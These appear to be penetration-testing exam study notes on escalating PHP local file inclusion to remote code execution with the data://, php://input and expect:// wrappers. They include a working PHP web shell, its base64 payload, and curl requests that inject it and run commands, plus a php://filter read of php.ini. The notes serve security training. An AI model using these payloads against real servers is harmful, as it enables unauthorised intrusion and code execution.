# PHP Wrappers — CPTS Exam Notes

## 🎯 Objective

**PHP Wrappers** can turn an **LFI (Local File Inclusion)** vulnerability into **Remote Code Execution (RCE)**.

Instead of only reading local files, PHP stream wrappers can sometimes be abused to make the vulnerable PHP function **execute attacker-controlled PHP code**.

### Common approaches

| Method                         | Purpose                                |
| ------------------------------ | -------------------------------------- |
| Credential/SSH key enumeration | Find passwords/private keys and log in |
| `data://` wrapper              | Inject and execute PHP code            |
| `php://input` wrapper          | Execute PHP code supplied in POST body |
| `expect://` wrapper            | Direct command execution               |
| `phar://`, `zip://`            | Useful in file-upload + LFI scenarios  |

---

# 1. `data://` Wrapper

The `data://` wrapper allows PHP to include **external data**, including PHP code.

### Requirement

The PHP configuration must have:

```ini
allow_url_include = On
```

> ⚠️ `allow_url_include` is **not enabled by default**.

It is also relevant to other attacks such as `php://input` and some RFI scenarios.

---

## 🔎 Check `allow_url_include`

PHP configuration locations:

### Apache

```text
/etc/php/X.Y/apache2/php.ini
```

### Nginx/PHP-FPM

```text
/etc/php/X.Y/fpm/php.ini
```

Use the `php://filter` wrapper to read the configuration through LFI:

```bash
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

Decode and search:

```bash
echo '<BASE64_DATA>' | base64 -d | grep allow_url_include
```

Expected:

```text
allow_url_include = On
```

### Exam takeaway

```text
LFI
 ↓
Read php.ini
 ↓
Check allow_url_include
 ↓
If On → try data:// / php://input
```

# 2. RCE with `data://`

Create a simple PHP web shell:

```php
<?php system($_GET["cmd"]); ?>
```

Base64 encode it:

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```

Result:

```text
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Then use:

```text
data://text/plain;base64,<BASE64_PAYLOAD>
```

Example:

```text
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

The important structure is:

```text
LFI parameter
    ↓
data://text/plain;base64,<PHP_CODE>
    ↓
&cmd=id
    ↓
Command execution
```

### cURL

```bash
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,<BASE64_PAYLOAD>&cmd=id' | grep uid
```

Example result:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirms command execution as the web-server user.

# 3. `php://input` Wrapper

`php://input` allows PHP to read **raw POST data**.

Instead of putting the PHP payload directly in the URL, send it in the **POST body**.

### Requirements

1. Vulnerable parameter must accept **POST requests**
2. `allow_url_include = On`

### Basic attack

```bash
curl -s -X POST \
--data '<?php system($_GET["cmd"]); ?>' \
"http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

Result:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Concept

```text
POST body
    ↓
<?php system($_GET["cmd"]); ?>
    ↓
php://input
    ↓
cmd=id
    ↓
RCE
```

---

## ⚠️ Important `php://input` Detail

The example uses:

```php
$_GET["cmd"]
```

Therefore, the application must allow the command to be supplied through GET.

If the vulnerable application only accepts POST, put the command directly into the PHP payload:

```php
<?php system('id'); ?>
```

### Exam distinction

| Situation                   | Payload                 |
| --------------------------- | ----------------------- |
| GET command parameter works | `system($_GET["cmd"])`  |
| Only POST accepted          | `system('id')` directly |

# 4. `expect://` Wrapper

The `expect://` wrapper can provide **direct command execution**.

Unlike `data://` and `php://input`, you don't need to create a PHP web shell.

Example:

```text
expect://id
```

Request:

```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
```

Result:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Requirements for `expect://`

`expect` is an **external PHP extension**.

Check `php.ini`:

```bash
echo '<BASE64_DATA>' | base64 -d | grep expect
```

Possible result:

```text
extension=expect
```

⚠️ **Important:** Seeing `extension=expect` does **not guarantee** that the extension is actually working.

The extension could fail to load.

### Confirm it by executing a command

```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

If command output appears, the wrapper is functional.

---

# 🧠 Wrapper Comparison

| Wrapper       | Payload location | Main requirement                     | RCE |
| ------------- | ---------------- | ------------------------------------ | --- |
| `data://`     | URL              | `allow_url_include=On`               | ✅   |
| `php://input` | POST body        | `allow_url_include=On`               | ✅   |
| `expect://`   | URL              | `expect` extension installed/working | ✅   |

### Quick memory trick

```text
data://       → Data in URL
php://input   → Input in POST body
expect://     → Execute command directly
```

# 🔥 CPTS Exam Workflow

When you have **LFI in a PHP application**, use this workflow:

```text
             LFI
              │
              ▼
       Read php.ini
              │
              ▼
   Check allow_url_include
              │
       ┌──────┴──────┐
       │             │
      On            Off
       │             │
       ▼             ▼
   Try data://   Try other LFI
       │
       ▼
  Try php://input
       │
       ▼
 Check expect extension
       │
       ▼
   expect://id
```

### Step-by-step checklist

* [ ] Identify PHP version.
* [ ] Locate `php.ini`.
* [ ] Use `php://filter` + Base64 to read it safely.
* [ ] Check `allow_url_include`.
* [ ] If enabled → test `data://`.
* [ ] If POST is accepted → test `php://input`.
* [ ] Check whether `expect` is installed.
* [ ] Test `expect://id` directly.
* [ ] Once RCE is confirmed, enumerate the target and proceed toward a stable shell.

## 📝 Key CPTS Takeaways

> **LFI does not always mean read-only access.** In PHP, wrappers can turn LFI into RCE.

* `data://` → inject PHP code through the URL.
* `php://input` → inject PHP code through POST data.
* `expect://` → execute commands directly.
* `data://` and `php://input` depend on `allow_url_include`.
* `expect://` requires the `expect` extension.
* `extension=expect` in `php.ini` **does not prove** the extension works; test it.
* `php://filter` + Base64 is useful for safely reading `php.ini`.
* Always confirm RCE with a harmless command such as:

```bash
id
```
